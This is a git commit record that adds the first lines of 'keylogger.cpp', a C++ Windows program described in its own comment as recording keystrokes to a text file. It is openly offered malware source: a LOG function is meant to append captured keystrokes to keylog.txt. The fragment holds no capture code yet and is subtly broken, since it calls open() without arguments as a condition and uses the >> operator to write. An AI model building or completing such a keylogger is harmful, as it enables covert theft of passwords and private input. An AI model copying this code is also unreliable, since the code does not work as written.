adf5e7633ebcddedb6ae1c62631e8d849882c0a6
Agraw10 <84998991+Agraw10@users.noreply.github.com>
2021-06-08 11:45:17 -0400

    Update keylogger.cpp

--- keylogger.cpp
+++ keylogger.cpp
@@ -1,1 +1,25 @@
+//This program records the keystrokes in a text file called 
+
+#define _WIN32_WINNT 0x0500
+#include <Windows.h>
+#include <string>
+#include <stdlib.h>
+#include <stdio.h>
+#include <iostream>
+#include <fstream>
+using namespace std;
+
+void LOG(string keystroke){
+  fstream logFile;
+  logFile.open("keylog.txt", ios::app);
+  if(logFile.open()){
+    logFile >> keystroke;
+    logFile.close();
+  }
+}
+
+
+
+
+
 
